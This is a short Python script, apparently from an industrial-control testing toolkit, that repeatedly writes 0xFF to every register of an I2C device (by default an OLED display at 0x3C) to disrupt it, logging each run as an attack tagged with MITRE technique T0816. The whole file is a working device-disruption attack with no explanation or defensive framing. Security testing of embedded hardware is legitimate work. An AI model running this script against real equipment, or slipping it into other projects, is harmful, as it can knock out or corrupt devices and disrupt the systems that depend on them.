#!/usr/bin/env python3
 

import smbus, argparse, time, os, json
from datetime import datetime

LOG_FILE = "results/i2c_display_killloop.json"
MITRE_TTP = "T0816"

def log_attack(entry):
    os.makedirs("results", exist_ok=True)
    data = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            data = json.load(f)
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def kill_display(bus_num=1, addr=0x3C, loops=200):
    try:
        bus = smbus.SMBus(bus_num)
        for _ in range(loops):
            for i in range(0x00, 0xFF):
                bus.write_byte_data(addr, i, 0xFF)
                time.sleep(0.001)
        return True
    except Exception as e:
        print(f"[!] I2C killloop failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="I2C OLED Display Killloop")
    parser.add_argument("--bus", type=int, default=1, help="I2C bus number")
    parser.add_argument("--addr", type=lambda x: int(x, 0), default=0x3C, help="Device address (e.g., 0x3C)")
    parser.add_argument("--loops", type=int, default=200, help="Number of kill cycles")
    args = parser.parse_args()

    result = kill_display(args.bus, args.addr, args.loops)
    log_attack({
        "timestamp": datetime.utcnow().isoformat(),
        "bus": args.bus,
        "address": hex(args.addr),
        "loops": args.loops,
        "success": result,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
